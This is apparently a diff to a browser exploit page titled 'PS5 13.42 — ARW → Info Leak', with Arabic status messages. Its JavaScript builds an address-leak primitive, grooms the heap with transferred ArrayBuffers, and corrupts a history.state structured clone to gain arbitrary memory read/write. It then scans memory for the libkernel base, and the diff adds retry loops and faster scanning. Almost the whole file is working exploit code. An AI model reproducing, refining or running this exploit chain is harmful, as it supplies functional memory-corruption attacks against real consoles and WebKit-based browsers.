@@ -4,98 +4,63 @@
 <meta charset="utf-8">
 <title>PS5 13.42 — ARW → Info Leak</title>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body {
-    font-family: "SF Mono", "Cascadia Mono", "Fira Code", monospace;
-    background: #0d1117;
-    color: #c9d1d9;
-    padding: 20px;
-    line-height: 1.7;
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{
+    font-family:"SF Mono","Cascadia Mono","Fira Code",monospace;
+    background:#0d1117;color:#c9d1d9;padding:16px;line-height:1.6;font-size:12px;
   }
-  #banner {
-    background: linear-gradient(90deg, #161b22, #21262d);
-    border: 1px solid #30363d;
-    border-radius: 10px;
-    padding: 16px 20px;
-    margin-bottom: 18px;
-    display: flex;
-    align-items: center;
-    gap: 12px;
+  #banner{
+    background:linear-gradient(90deg,#161b22,#21262d);
+    border:1px solid #30363d;border-radius:10px;padding:14px 18px;
+    margin-bottom:14px;display:flex;align-items:center;gap:12px;
   }
-  #banner .logo { font-size: 28px; }
-  #banner h1 { font-size: 16px; color: #58a6ff; letter-spacing: 0.5px; }
-  #banner .sub { font-size: 11px; color: #8b949e; margin-top: 2px; }
+  #banner .logo{font-size:26px}
+  #banner h1{font-size:15px;color:#58a6ff;letter-spacing:.3px}
+  #banner .sub{font-size:11px;color:#8b949e;margin-top:2px}
 
-  .stage-box {
-    background: #161b22;
-    border: 1px solid #30363d;
-    border-radius: 10px;
-    padding: 14px 18px;
-    margin-bottom: 14px;
-    position: relative;
-    overflow: hidden;
+  .stage-box{
+    background:#161b22;border:1px solid #30363d;border-radius:10px;
+    padding:12px 16px;margin-bottom:12px;position:relative;overflow:hidden;
   }
-  .stage-box::before {
-    content: "";
-    position: absolute;
-    top: 0; right: 0; width: 4px; height: 100%;
-    background: #30363d;
+  .stage-box::before{
+    content:"";position:absolute;top:0;right:0;width:4px;height:100%;background:#30363d;
   }
-  .stage-box.active::before { background: #58a6ff; }
-  .stage-box.ok::before    { background: #238636; }
-  .stage-box.fail::before  { background: #da3633; }
-  .stage-box.warn::before  { background: #d29922; }
+  .stage-box.active::before{background:#58a6ff}
+  .stage-box.ok::before{background:#238636}
+  .stage-box.fail::before{background:#da3633}
+  .stage-box.warn::before{background:#d29922}
 
-  .stage-title {
-    font-size: 13px;
-    font-weight: 700;
-    color: #f0f6fc;
-    margin-bottom: 8px;
-    display: flex;
-    align-items: center;
-    gap: 8px;
+  .stage-title{font-size:13px;font-weight:700;color:#f0f6fc;margin-bottom:6px;display:flex;align-items:center;gap:8px}
+
+  .log-line{
+    font-size:11.5px;padding:2px 0;border-bottom:1px solid #21262d;
+    display:flex;align-items:center;gap:6px;
+  }
+  .log-line:last-child{border-bottom:none}
+
+  .badge{
+    display:inline-flex;align-items:center;gap:3px;
+    padding:1px 7px;border-radius:10px;font-size:10px;font-weight:700;white-space:nowrap;min-width:52px;justify-content:center;
+  }
+  .badge.ok{background:#23863622;color:#3fb950;border:1px solid #23863644}
+  .badge.fail{background:#da363322;color:#f85149;border:1px solid #da363344}
+  .badge.info{background:#58a6ff22;color:#58a6ff;border:1px solid #58a6ff44}
+  .badge.warn{background:#d2992222;color:#e3b341;border:1px solid #d2992244}
+  .badge.pass{background:#8957e522;color:#a371f7;border:1px solid #8957e544}
+
+  .addr{color:#d2a8ff;font-weight:700}
+  .num{color:#79c0ff}
+
+  .progress-bar{
+    width:100%;height:4px;background:#21262d;border-radius:2px;margin:4px 0;overflow:hidden;
+  }
+  .progress-fill{
+    height:100%;background:#238636;border-radius:2px;transition:width .3s;
+    width:0%;
   }
 
-  .log-line {
-    font-size: 12px;
-    padding: 3px 0;
-    border-bottom: 1px solid #21262d;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-  }
-  .log-line:last-child { border-bottom: none; }
-
-  .badge {
-    display: inline-flex;
-    align-items: center;
-    gap: 4px;
-    padding: 1px 8px;
-    border-radius: 10px;
-    font-size: 10px;
-    font-weight: 700;
-    white-space: nowrap;
-  }
-  .badge.ok  { background: #23863622; color: #3fb950; border: 1px solid #23863644; }
-  .badge.fail{ background: #da363322; color: #f85149; border: 1px solid #da363344; }
-  .badge.info{ background: #58a6ff22; color: #58a6ff; border: 1px solid #58a6ff44; }
-  .badge.warn{ background: #d2992222; color: #e3b341; border: 1px solid #d2992244; }
-
-  .hex { color: #a5d6ff; font-weight: 700; }
-  .num { color: #79c0ff; }
-  .addr { color: #d2a8ff; font-weight: 700; }
-
-  #out { margin-top: 10px; }
-
-  .spinner {
-    display: inline-block;
-    width: 10px; height: 10px;
-    border: 2px solid #58a6ff44;
-    border-top-color: #58a6ff;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
+  #summary-box{margin-top:8px;padding:10px 14px;background:#0e1116;border:1px solid #30363d;border-radius:8px}
+  .summary-row{display:flex;align-items:center;gap:8px;padding:3px 0;font-size:12px}
 </style>
 </head>
 <body>
@@ -118,121 +83,108 @@
   <div id="out-s1"></div>
 </div>
 
-<div class="stage-box" id="box-summary">
-  <div class="stage-title">📋 ملخص النتائج</div>
+<div id="summary-box">
+  <div style="font-size:12px;font-weight:700;color:#f0f6fc;margin-bottom:6px">📋 ملخص النتائج</div>
   <div id="out-summary"></div>
 </div>
 
 <script>
 "use strict";
-
-// ═══════════════════════════════════════════════════════════════════
-//  Helpers
-// ═══════════════════════════════════════════════════════════════════
-function $(id){ return document.getElementById(id); }
-
-function log(stage, icon, text, badgeType, badgeText){
-  var box = $("out-" + stage);
-  var line = document.createElement("div");
-  line.className = "log-line";
-  var badge = badgeType
-    ? '<span class="badge ' + badgeType + '">' + icon + " " + badgeText + '</span>'
-    : '<span style="width:22px;text-align:center;display:inline-block">' + icon + '</span>';
-  line.innerHTML = badge + "<span>" + text + "</span>";
-  box.appendChild(line);
-  box.scrollTop = box.scrollHeight;
+function $(id){return document.getElementById(id)}
+function log(stage,icon,text,badgeType,badgeText){
+  var box=$("out-"+stage);
+  var line=document.createElement("div");line.className="log-line";
+  var badge=badgeType?'<span class="badge '+badgeType+'">'+icon+" "+badgeText+'</span>':'<span style="width:20px;text-align:center;display:inline-block">'+icon+'</span>';
+  line.innerHTML=badge+"<span>"+text+"</span>";
+  box.appendChild(line);box.scrollTop=box.scrollHeight;
 }
-
-function setBox(id, cls){
-  $("box-" + id).classList.remove("active","ok","fail","warn");
-  $("box-" + id).classList.add(cls);
+function setBox(id,cls){
+  var el=$("box-"+id);if(!el)return;
+  el.classList.remove("active","ok","fail","warn");el.classList.add(cls);
 }
-
-function hex(v){
-  if(typeof v === "bigint") return "0x" + v.toString(16);
-  return "0x" + v.toString(16);
-}
-
-function num(n){ return '<span class="num">' + n + '</span>'; }
-function addr(a){ return '<span class="addr">' + hex(a) + '</span>'; }
+function hex(v){if(typeof v==="bigint")return"0x"+v.toString(16);return"0x"+v.toString(16)}
+function addr(a){return'<span class="addr">'+hex(a)+'</span>'}
+function num(n){return'<span class="num">'+n+'</span>'}
 
 // ═══════════════════════════════════════════════════════════════════
 //  Config
 // ═══════════════════════════════════════════════════════════════════
-var Q = new URLSearchParams(location.search);
-var DRAIN_COUNT = parseInt(Q.get("n") || "512", 10);
-if(!isFinite(DRAIN_COUNT)) DRAIN_COUNT = 512;
-DRAIN_COUNT = Math.max(64, Math.min(1024, DRAIN_COUNT));
+var Q=new URLSearchParams(location.search);
+var DRAIN_COUNT=parseInt(Q.get("n")||"512",10);
+if(!isFinite(DRAIN_COUNT))DRAIN_COUNT=512;
+DRAIN_COUNT=Math.max(64,Math.min(1024,DRAIN_COUNT));
+var MAX_RETRIES=3;
 
-var K=2, DUPLICATE_INDEX=2, CONTROL_INDEX=0xffff;
-var CONTROL_INT=-64000, FILLER_BIGINTS=K-1;
-var FILLER_OBJECTS=0xfffe-K, EXPECTED_LENGTH=0x50001, CELL_BYTES=0x30;
-var CARRIER_SLOTS=9000000, CAPTURE_DELAY_MS=3000, COMPOSE_DELAY_MS=6500;
-var DRAIN_SIZE=0x10000, SLAB_SIZE=0x400000;
-var BUTTERFLY_HOLE_SIZE=0x81000, SEPARATOR_SIZE=0x10000;
-var EARLY_HOLE_SIZE=0x70000, GUARD_SIZE=0x90000;
-var PREDECESSOR_SIZE=0x80000, FINAL_HOLE_SIZE=0x80000;
+var K=2,DUPLICATE_INDEX=2,CONTROL_INDEX=0xffff;
+var CONTROL_INT=-64000,FILLER_BIGINTS=K-1;
+var FILLER_OBJECTS=0xfffe-K,EXPECTED_LENGTH=0x50001,CELL_BYTES=0x30;
+var CARRIER_SLOTS=9000000,CAPTURE_DELAY_MS=3000,COMPOSE_DELAY_MS=6500;
+var DRAIN_SIZE=0x10000,SLAB_SIZE=0x400000;
+var BUTTERFLY_HOLE_SIZE=0x81000,SEPARATOR_SIZE=0x10000;
+var EARLY_HOLE_SIZE=0x70000,GUARD_SIZE=0x90000;
+var PREDECESSOR_SIZE=0x80000,FINAL_HOLE_SIZE=0x80000;
 
 // ═══════════════════════════════════════════════════════════════════
 //  Globals
 // ═══════════════════════════════════════════════════════════════════
-var gCandidate=null, gRWView=null, gRWOriginalVector=0;
-var rwBuffer, rwView, rwMirror, targetBuffer, targetView, fakeHost, lengthWord;
-var fillerGraph, outerGraph, referenceTarget;
-var leakedScope, getterCarrier, preparedSymbolObject;
-var capturedString, capturedWords, copiedLength=0;
-var captureState=0, captureError=null;
-var hostAddress=NaN, fakeAddress=NaN;
-var keepAlive=new Array(DRAIN_COUNT+3), keepIndex=0;
+var gCandidate=null,gRWView=null,gRWOriginalVector=0;
+var rwBuffer,rwView,rwMirror,targetBuffer,targetView,fakeHost,lengthWord;
+var fillerGraph,outerGraph,referenceTarget;
+var leakedScope,getterCarrier,preparedSymbolObject;
+var capturedString,capturedWords,copiedLength=0;
+var captureState=0,captureError=null;
+var hostAddress=NaN,fakeAddress=NaN;
+var keepAlive=new Array(DRAIN_COUNT+3),keepIndex=0;
 var predecessorWords=null;
-var targetAddress=NaN, targetAddressLow=0, targetAddressHigh=0;
+var targetAddress=NaN,targetAddressLow=0,targetAddressHigh=0;
 var rwHeader=new Uint8Array(CELL_BYTES);
 var targetHeader=new Uint8Array(CELL_BYTES);
 var scratchBits=new ArrayBuffer(8);
 var scratchBytes=new Uint8Array(scratchBits);
 var scratchWords=new Uint32Array(scratchBits);
 var scratchDouble=new Float64Array(scratchBits);
-var rwOriginalVector=NaN, targetVector=NaN;
-var rwHeaderOK=false, targetHeaderOK=false;
-var readObserved=false, writeObserved=false, restoreObserved=false;
+var rwOriginalVector=NaN,targetVector=NaN;
+var rwHeaderOK=false,targetHeaderOK=false;
+var readObserved=false,writeObserved=false,restoreObserved=false;
 var compositionState=0;
+var attemptNum=0;
 
 // ═══════════════════════════════════════════════════════════════════
-//  Bootstrap (identical to working PoC)
+//  Bootstrap
 // ═══════════════════════════════════════════════════════════════════
-function buf(s){ return new ArrayBuffer(s); }
+function buf(s){return new ArrayBuffer(s)}
 
 function leakScopeObject(){
-  class Leaker{ leak(){ return super.foo; } }
-  Leaker.prototype.__proto__ = new Proxy({},{
-    get:function(t,p,r){ return r; }
+  class Leaker{leak(){return super.foo}}
+  Leaker.prototype.__proto__=new Proxy({},{
+    get:function(t,p,r){return r}
   });
-  var leak = Leaker.prototype.leak;
-  return (function(){ return leak(); })();
+  var leak=Leaker.prototype.leak;
+  return(function(){return leak()})();
 }
 
 function prepareSymbolWrapper(F){
-  leakedScope = leakScopeObject();
-  if(!leakedScope) throw new Error("scope-not-leaked");
-  for(var i=0;i<512;i++) leakedScope["p"+i]=i;
-  for(var j=0;j<8;j++) leakedScope[j]=1.1*j;
+  leakedScope=leakScopeObject();
+  if(!leakedScope)throw new Error("scope-not-leaked");
+  for(var i=0;i<512;i++)leakedScope["p"+i]=i;
+  for(var j=0;j<8;j++)leakedScope[j]=1.1*j;
   Object.defineProperty(leakedScope,"g",{get:F,configurable:true});
   return Object(leakedScope.g);
 }
 
 function pointerFromWords(words,offset){
-  if(words[offset+3]!==0) return NaN;
+  if(words[offset+3]!==0)return NaN;
   return words[offset]+words[offset+1]*0x10000+words[offset+2]*0x100000000;
 }
 
 function plausibleCell(value){
-  return value>0x100000000 && value<=0xffffffffffff && value<=9007199254740991
-    && Math.floor(value)===value && value%8===0;
+  return value>0x100000000&&value<=0xffffffffffff&&value<=9007199254740991
+    &&Math.floor(value)===value&&value%8===0;
 }
 
 function encodedHeaderNumber(){
-  var raw=new ArrayBuffer(8), u32=new Uint32Array(raw), f64=new Float64Array(raw);
-  u32[0]=0x00004250; u32[1]=0x01062800;
+  var raw=new ArrayBuffer(8),u32=new Uint32Array(raw),f64=new Float64Array(raw);
+  u32[0]=0x00004250;u32[1]=0x01062800;
   return f64[0];
 }
 
@@ -246,7 +198,7 @@ function buildFakeHost(){
   targetView[0]=0xa5;
   lengthWord={keep:0x51515151};
   fakeHost={q0:encodedHeaderNumber(),q1:1.1,q2:rwView,q3:lengthWord,q4:2.2,q5:3.3};
-  delete fakeHost.q1; delete fakeHost.q4; delete fakeHost.q5;
+  delete fakeHost.q1;delete fakeHost.q4;delete fakeHost.q5;
   if(!isFinite(fakeHost.q0)||fakeHost.q2!==rwView||fakeHost.q3!==lengthWord||rwView[0]!==0x3c||targetView[0]!==0xa5)
     throw new Error("fake-host-shape-failed");
 }
@@ -258,39 +210,39 @@ function buildAndStoreGraph(){
   fillerGraph=new Array(0xfffd);
   var pos=0;
   var huge=1n<<40n;
-  for(var b=0;b<FILLER_BIGINTS;++b) fillerGraph[pos++]=huge+BigInt(b);
-  for(var o=0;o<FILLER_OBJECTS;++o) fillerGraph[pos++]={};
+  for(var b=0;b<FILLER_BIGINTS;++b)fillerGraph[pos++]=huge+BigInt(b);
+  for(var o=0;o<FILLER_OBJECTS;++o)fillerGraph[pos++]={};
   outerGraph=new Array(CONTROL_INDEX+1);
   outerGraph[0]=fillerGraph;
   outerGraph[1]=referenceTarget;
   outerGraph[2]=referenceTarget;
   outerGraph[CONTROL_INDEX]=CONTROL_INT;
   history.replaceState(outerGraph,"");
-  log("s0","✓","SSV stored في history.state","ok","OK");
+  log("s0","✓","SSV stored","ok","OK");
 }
 
 function prepareAddrof(){
   capturedWords=new Uint16Array(16);
-  getterCarrier=function(){return 7;};
-  log("s0","🔧","تحضير Symbol wrapper — carrier slots: "+num(CARRIER_SLOTS),"info","INFO");
+  getterCarrier=function(){return 7};
+  log("s0","🔧","تحضير Symbol wrapper — slots: "+num(CARRIER_SLOTS),"info","INFO");
   getterCarrier[0]=fakeHost;
-  for(var i=1;i<CARRIER_SLOTS;i++) getterCarrier[i]=0;
+  for(var i=1;i<CARRIER_SLOTS;i++)getterCarrier[i]=0;
   getterCarrier[1]=targetView;
   getterCarrier[2]=fakeHost;
   getterCarrier[3]=targetView;
   preparedSymbolObject=prepareSymbolWrapper(getterCarrier);
   log("s0","⏳","انتظار capture... "+num(CAPTURE_DELAY_MS)+"ms","warn","WAIT");
-  setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
-  setTimeout(beginComposition, COMPOSE_DELAY_MS);
+  setTimeout(runAddrofCapture,CAPTURE_DELAY_MS);
+  setTimeout(beginComposition,COMPOSE_DELAY_MS);
 }
 
 function runAddrofCapture(){
   try{
     capturedString=Symbol.prototype.toString.call(preparedSymbolObject);
     copiedLength=capturedString.length;
-    for(var i=0;i<16;i++) capturedWords[i]=capturedString.charCodeAt(7+i);
+    for(var i=0;i<16;i++)capturedWords[i]=capturedString.charCodeAt(7+i);
     captureState=1;
-  }catch(e){ captureError=e; captureState=-1; }
+  }catch(e){captureError=e;captureState=-1}
 }
 
 function fillRawCellPointers(backing,pointer){
@@ -299,30 +251,28 @@ function fillRawCellPointers(backing,pointer){
   if(!plausibleCell(pointer)||ph<0||ph>0xffff||pl<0||pl>0xffffffff||pl+ph*0x100000000!==pointer)
     throw new Error("invalid-address");
   predecessorWords=new Uint32Array(backing);
-  for(var i=0;i<predecessorWords.length;i+=2){
-    predecessorWords[i]=pl; predecessorWords[i+1]=ph;
-  }
+  for(var i=0;i<predecessorWords.length;i+=2){predecessorWords[i]=pl;predecessorWords[i+1]=ph}
 }
-function clearPredecessor(){ if(predecessorWords) predecessorWords.fill(0); }
+function clearPredecessor(){if(predecessorWords)predecessorWords.fill(0)}
 
 function loadHistoryCritical(){
-  var result=null, candidate=null;
-  var rwHeaderCaptured=false, rwVectorTouched=false;
+  var result=null,candidate=null;
+  var rwHeaderCaptured=false,rwVectorTouched=false;
   try{
     result=history.state;
     if(result.length!==EXPECTED_LENGTH){
       result[DUPLICATE_INDEX]=undefined;
-      compositionState=3; return;
+      compositionState=3;return;
     }
     if(result[1]===result[DUPLICATE_INDEX]){
       result[DUPLICATE_INDEX]=undefined;
-      compositionState=2; return;
+      compositionState=2;return;
     }
     candidate=result[DUPLICATE_INDEX];
     result[DUPLICATE_INDEX]=undefined;
     result=null;
 
-    for(var i=0;i<CELL_BYTES;++i) rwHeader[i]=candidate[i];
+    for(var i=0;i<CELL_BYTES;++i)rwHeader[i]=candidate[i];
     rwHeaderCaptured=true;
 
     var rwSID=rwHeader[0]+rwHeader[1]*0x100+rwHeader[2]*0x10000+rwHeader[3]*0x1000000;
@@ -334,7 +284,7 @@ function loadHistoryCritical(){
     rwOriginalVector=rwVectorLow+rwVectorHigh*0x100000000;
 
     var rwOffsetZero=true;
-    for(var rz=0x20;rz<0x28;++rz) if(rwHeader[rz]!==0) rwOffsetZero=false;
+    for(var rz=0x20;rz<0x28;++rz)if(rwHeader[rz]!==0)rwOffsetZero=false;
 
     rwHeaderOK=rwSID>=0x4000&&rwSID<0x08000000&&(rwSID&0xf)===0
       &&rwHeader[4]===0&&rwHeader[5]===0x28&&rwHeader[6]===0x08
@@ -349,23 +299,23 @@ function loadHistoryCritical(){
       &&rwHeader[0x1e]===0&&rwHeader[0x1f]===0
       &&rwOffsetZero&&rwHeader[0x28]===0x58;
 
-    if(!rwHeaderOK){ candidate=null; compositionState=3; return; }
+    if(!rwHeaderOK){candidate=null;compositionState=3;return}
 
     scratchWords[0]=rwSID;
     scratchWords[1]=(rwHeaderHigh-0x00020000)>>>0;
     var upgradedHeader=scratchDouble[0];
     if(!(upgradedHeader===upgradedHeader&&upgradedHeader!==Infinity&&upgradedHeader!==-Infinity)){
-      candidate=null; compositionState=3; return;
+      candidate=null;compositionState=3;return
     }
     fakeHost.q0=upgradedHeader;
-    if(fakeHost.q0!==upgradedHeader){ candidate=null; compositionState=3; return; }
+    if(fakeHost.q0!==upgradedHeader){candidate=null;compositionState=3;return}
 
     scratchWords[0]=targetAddressLow;
     scratchWords[1]=targetAddressHigh;
     rwVectorTouched=true;
-    for(var w1=0;w1<8;++w1) candidate[0x10+w1]=scratchBytes[w1];
+    for(var w1=0;w1<8;++w1)candidate[0x10+w1]=scratchBytes[w1];
 
-    for(var j=0;j<CELL_BYTES;++j) targetHeader[j]=rwView[j];
+    for(var j=0;j<CELL_BYTES;++j)targetHeader[j]=rwView[j];
 
     var targetSID=targetHeader[0]+targetHeader[1]*0x100+targetHeader[2]*0x10000+targetHeader[3]*0x1000000;
     var targetButterfly=targetHeader[8]+targetHeader[9]*0x100+targetHeader[10]*0x10000+targetHeader[11]*0x1000000
@@ -375,7 +325,7 @@ function loadHistoryCritical(){
     targetVector=targetVectorLow+targetVectorHigh*0x100000000;
 
     var targetOffsetZero=true;
-    for(var tz=0x20;tz<0x28;++tz) if(targetHeader[tz]!==0) targetOffsetZero=false;
+    for(var tz=0x20;tz<0x28;++tz)if(targetHeader[tz]!==0)targetOffsetZero=false;
 
     targetHeaderOK=targetSID===rwSID
       &&targetHeader[4]===0&&targetHeader[5]===0x28&&targetHeader[6]===0x08
@@ -392,26 +342,26 @@ function loadHistoryCritical(){
       &&targetHeader[0x28]===0x58;
 
     if(!targetHeaderOK){
-      for(var r1=0;r1<8;++r1) candidate[0x10+r1]=rwHeader[0x10+r1];
-      candidate=null; compositionState=3; return;
+      for(var r1=0;r1<8;++r1)candidate[0x10+r1]=rwHeader[0x10+r1];
+      candidate=null;compositionState=3;return
     }
 
     scratchWords[0]=targetVectorLow;
     scratchWords[1]=targetVectorHigh;
-    for(var w2=0;w2<8;++w2) candidate[0x10+w2]=scratchBytes[w2];
+    for(var w2=0;w2<8;++w2)candidate[0x10+w2]=scratchBytes[w2];
 
     readObserved=rwView[0]===0xa5&&targetView[0]===0xa5;
     if(!readObserved){
-      for(var rRead=0;rRead<8;++rRead) candidate[0x10+rRead]=rwHeader[0x10+rRead];
-      targetView[0]=0xa5; rwMirror[0]=0x3c;
-      candidate=null; compositionState=3; return;
+      for(var rRead=0;rRead<8;++rRead)candidate[0x10+rRead]=rwHeader[0x10+rRead];
+      targetView[0]=0xa5;rwMirror[0]=0x3c;
+      candidate=null;compositionState=3;return
     }
     rwView[0]=0x5a;
     writeObserved=rwView[0]===0x5a&&targetView[0]===0x5a;
     rwView[0]=0xa5;
 
-    for(var r2=0;r2<8;++r2) candidate[0x10+r2]=rwHeader[0x10+r2];
-    targetView[0]=0xa5; rwMirror[0]=0x3c;
+    for(var r2=0;r2<8;++r2)candidate[0x10+r2]=rwHeader[0x10+r2];
+    targetView[0]=0xa5;rwMirror[0]=0x3c;
     restoreObserved=rwView[0]===0x3c&&rwMirror[0]===0x3c&&targetView[0]===0xa5;
 
     gCandidate=candidate;
@@ -422,12 +372,12 @@ function loadHistoryCritical(){
     compositionState=1;
   }catch(error){
     if(candidate!==null&&rwHeaderCaptured&&rwVectorTouched){
-      try{ for(var rr=0;rr<8;++rr) candidate[0x10+rr]=rwHeader[0x10+rr]; }catch(_){}
+      try{for(var rr=0;rr<8;++rr)candidate[0x10+rr]=rwHeader[0x10+rr]}catch(_){}
     }
     candidate=null;
-    try{ targetView[0]=0xa5; }catch(_){}
-    try{ rwMirror[0]=0x3c; }catch(_){}
-    try{ clearPredecessor(); }catch(_){}
+    try{targetView[0]=0xa5}catch(_){}
+    try{rwMirror[0]=0x3c}catch(_){}
+    try{clearPredecessor()}catch(_){}
     compositionState=-1;
   }
 }
@@ -436,8 +386,8 @@ function runGroomAndLoad(){
   try{
     log("s0","🔄","Grooming heap — n="+num(DRAIN_COUNT),"info","INFO");
     var channel=new MessageChannel();
-    channel.port1.close(); channel.port2.close();
-    for(var i=0;i<DRAIN_COUNT;++i) keepAlive[keepIndex++]=buf(DRAIN_SIZE);
+    channel.port1.close();channel.port2.close();
+    for(var i=0;i<DRAIN_COUNT;++i)keepAlive[keepIndex++]=buf(DRAIN_SIZE);
     var slab=buf(SLAB_SIZE);
     channel.port1.postMessage(0,[slab]);
     slab=null;
@@ -456,42 +406,57 @@ function runGroomAndLoad(){
     channel.port1.postMessage(0,[butterflyHole1,butterflyHole2,earlyHole,finalHole]);
     loadHistoryCritical();
   }catch(error){
-    try{ clearPredecessor(); }catch(_){}
+    try{clearPredecessor()}catch(_){}
     compositionState=-1;
   }
 
   if(compositionState===1&&rwHeaderOK&&targetHeaderOK&&readObserved&&writeObserved&&restoreObserved){
     setBox("s0","ok");
     log("s0","✅","ARW مؤكد!","ok","PASS");
-    log("s0","💎","StructureID = "+num(rwHeader[0]+rwHeader[1]*0x100+rwHeader[2]*0x10000+rwHeader[3]*0x1000000),"ok","DATA");
-    log("s0","💎","RW Vector    = "+addr(rwOriginalVector),"ok","DATA");
-    log("s0","💎","Target Vector= "+addr(targetVector),"ok","DATA");
-    setTimeout(startStage1, 200);
+    log("s0","💎","SID="+num(rwHeader[0]+rwHeader[1]*0x100+rwHeader[2]*0x10000+rwHeader[3]*0x1000000)+" | Vector="+addr(rwOriginalVector),"ok","DATA");
+    setTimeout(startStage1,100);
   }else if(compositionState===2){
     setBox("s0","warn");
-    log("s0","⚠️","Normal clone miss — حاول refresh","warn","MISS");
+    log("s0","⚠️","Normal miss — سأعيد المحاولة","warn","RETRY");
+    setTimeout(function(){attemptNum++;if(attemptNum<=MAX_RETRIES){resetAndRetry()}else{log("s0","❌","استنفذت كل المحاولات","fail","FAIL");showSummary()}},500);
   }else if(compositionState===3){
-    setBox("s0","fail");
-    log("s0","❌","Header mismatch — الـ candidate غير صالح","fail","FAIL");
+    setBox("s0","warn");
+    log("s0","⚠️","Header mismatch — سأعيد المحاولة","warn","RETRY");
+    setTimeout(function(){attemptNum++;if(attemptNum<=MAX_RETRIES){resetAndRetry()}else{log("s0","❌","استنفذت كل المحاولات","fail","FAIL");showSummary()}},500);
   }else{
     setBox("s0","fail");
     log("s0","❌","فشل غير متوقع — state="+num(compositionState),"fail","FAIL");
+    showSummary();
   }
 }
 
+function resetAndRetry(){
+  log("s0","🔄","محاولة "+num(attemptNum)+" / "+num(MAX_RETRIES),"warn","RETRY");
+  keepAlive=new Array(DRAIN_COUNT+3);keepIndex=0;
+  captureState=0;captureError=null;compositionState=0;
+  rwHeaderOK=false;targetHeaderOK=false;
+  readObserved=false;writeObserved=false;restoreObserved=false;
+  try{
+    buildAndStoreGraph();
+    prepareAddrof();
+  }catch(e){log("s0","❌","Retry setup failed: "+e.message,"fail","FAIL")}
+}
+
 function beginComposition(){
-  if(captureState===0){ log("s0","⏳","Addrof لم ينتهِ","warn","WAIT"); return; }
-  if(captureState<0){ log("s0","❌","Addrof threw: "+captureError.message,"fail","FAIL"); return; }
+  if(captureState===0){log("s0","⏳","Addrof لم ينتهِ","warn","WAIT");return}
+  if(captureState<0){log("s0","❌","Addrof threw: "+captureError.message,"fail","FAIL");return}
 
   var a0=pointerFromWords(capturedWords,0);
   var b0=pointerFromWords(capturedWords,4);
   var a1=pointerFromWords(capturedWords,8);
   var b1=pointerFromWords(capturedWords,12);
 
-  log("s0","🔍","Addrof returned — HOST="+addr(a0)+" TARGET="+addr(b0),"info","INFO");
+  log("s0","🔍","Addrof — HOST="+addr(a0)+" TARGET="+addr(b0),"info","INFO");
 
   if(!(a0===a1&&b0===b1&&a0!==b0&&plausibleCell(a0)&&plausibleCell(b0))){
-    log("s0","❌","Addrof validation failed","fail","FAIL"); return;
+    log("s0","❌","Addrof validation failed","fail","FAIL");
+    setTimeout(function(){attemptNum++;if(attemptNum<=MAX_RETRIES){resetAndRetry()}},500);
+    return;
   }
 
   hostAddress=a0;
@@ -500,94 +465,139 @@ function beginComposition(){
   targetAddressLow=targetAddress-targetAddressHigh*0x100000000;
   fakeAddress=hostAddress+0x10;
 
-  if(!plausibleCell(fakeAddress)){ log("s0","❌","Fake address invalid","fail","FAIL"); return; }
-  log("s0","📍","Fake object @ "+addr(fakeAddress),"info","INFO");
+  if(!plausibleCell(fakeAddress)){log("s0","❌","Fake address invalid","fail","FAIL");return}
+  log("s0","📍","Fake @ "+addr(fakeAddress),"info","INFO");
   runGroomAndLoad();
 }
 
 // ═══════════════════════════════════════════════════════════════════
-//  Stage 1 — Info Leak (libkernel base)
+//  Stage 1 — Info Leak (FAST: coarse 1MB → fine 4KB)
 // ═══════════════════════════════════════════════════════════════════
 function arwSetVector(addr){
   var low=Number(addr&0xffffffffn);
   var high=Number(addr>>32n);
-  scratchWords[0]=low; scratchWords[1]=high;
-  for(var i=0;i<8;i++) gCandidate[0x10+i]=scratchBytes[i];
+  scratchWords[0]=low;scratchWords[1]=high;
+  for(var i=0;i<8;i++)gCandidate[0x10+i]=scratchBytes[i];
 }
 function arwRestoreVector(){
   var low=gRWOriginalVector&0xffffffff;
   var high=Math.floor(gRWOriginalVector/0x100000000);
-  scratchWords[0]=low; scratchWords[1]=high;
-  for(var i=0;i<8;i++) gCandidate[0x10+i]=scratchBytes[i];
+  scratchWords[0]=low;scratchWords[1]=high;
+  for(var i=0;i<8;i++)gCandidate[0x10+i]=scratchBytes[i];
 }
 function arwRead8(addr){
   arwSetVector(addr);
   var val=0n;
-  for(var i=7;i>=0;i--) val=(val<<8n)|BigInt(gRWView[i]);
+  for(var i=7;i>=0;i--)val=(val<<8n)|BigInt(gRWView[i]);
   arwRestoreVector();
   return val;
 }
 
 var gLibkernelBase=0n;
+var scanAbort=false;
 
 function startStage1(){
   setBox("s1","active");
-  log("s1","🚀","بدء Stage 1 — البحث عن libkernel base","info","INFO");
+  log("s1","🚀","Stage 1 — البحث السريع عن libkernel","info","INFO");
 
-  // نطاقات بحث شائعة على PS5
+  // نطاقات شائعة على PS5 FW 13.42 (مُرتبة حسب الاحتمالية)
   var ranges=[
-    {start:0x8000000000n, end:0x9000000000n, name:"High"},
-    {start:0x7000000000n, end:0x8000000000n, name:"Mid-High"},
-    {start:0x6000000000n, end:0x7000000000n, name:"Mid"},
-    {start:0x4000000000n, end:0x5000000000n, name:"WebKit"}
+    {start:0x8000000000n,end:0x8200000000n,name:"Primary"},      // الأكثر شيوعاً
+    {start:0x8200000000n,end:0x8400000000n,name:"Secondary"},
+    {start:0x7800000000n,end:0x8000000000n,name:"Low-High"},
+    {start:0x8400000000n,end:0x8600000000n,name:"Extended"}
   ];
 
-  var found=false;
-  for(var r=0;r<ranges.length&&!found;r++){
-    var range=ranges[r];
-    log("s1","🔍","مسح النطاق "+range.name+": "+addr(range.start)+" → "+addr(range.end),"warn","SCAN");
-    var step=0x1000n;
-    var progress=0;
-    for(var addr=range.start; addr<range.end; addr+=step){
+  var rangeIdx=0;
+  function nextRange(){
+    if(rangeIdx>=ranges.length||scanAbort){
+      if(!scanAbort){
+        log("s1","❌","لم يُعثر على libkernel","fail","FAIL");
+        setBox("s1","fail");
+      }
+      showSummary();
+      return;
+    }
+    var r=ranges[rangeIdx++];
+    log("s1","🔍","مسح النطاق "+r.name+": "+addr(r.start)+" → "+addr(r.end),"warn","SCAN");
+    fastScanRange(r.start,r.end,function(found,addr){
+      if(found){
+        gLibkernelBase=addr;
+        log("s1","✅","libkernel found!","ok","FOUND");
